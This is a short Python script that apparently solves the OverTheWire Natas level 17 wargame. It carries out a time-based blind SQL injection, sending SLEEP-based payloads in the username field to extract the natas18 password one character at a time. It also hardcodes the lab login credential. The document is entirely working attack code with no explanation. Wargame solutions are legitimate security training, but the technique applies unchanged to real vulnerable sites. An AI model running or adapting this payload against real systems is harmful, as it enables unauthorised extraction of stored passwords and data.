import requests
import time

url="http://natas17.natas.labs.overthewire.org/"
auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
           '0','1','2','3','4','5','6','7','8','9']
password=""
for n in range(1,33):
    for i in characters:
        payload="natas18\" and SUBSTRING(password, "+str(n)+", 1) = "+"'"+i+"'"+" AND IF(1=1, SLEEP(10), 0) -- "
        user_search={"username" : payload}
        start = time.time()
        response = requests.post(url,data=user_search,auth=auth)
        end = time.time()
        
        if end-start > 10.0:
            payload="natas18\" and BINARY SUBSTRING(password, "+str(n)+", 1) = UPPER(SUBSTRING(password, "+str(n)+", 1)) AND IF(1=1, SLEEP(10), 0) -- "
            user_search={"username" : payload}
            start = time.time()
            response = requests.post(url,data=user_search,auth=auth)
            end = time.time()
            if end-start>10.0:
                i=i.upper()
            password += i
            print(password)
            break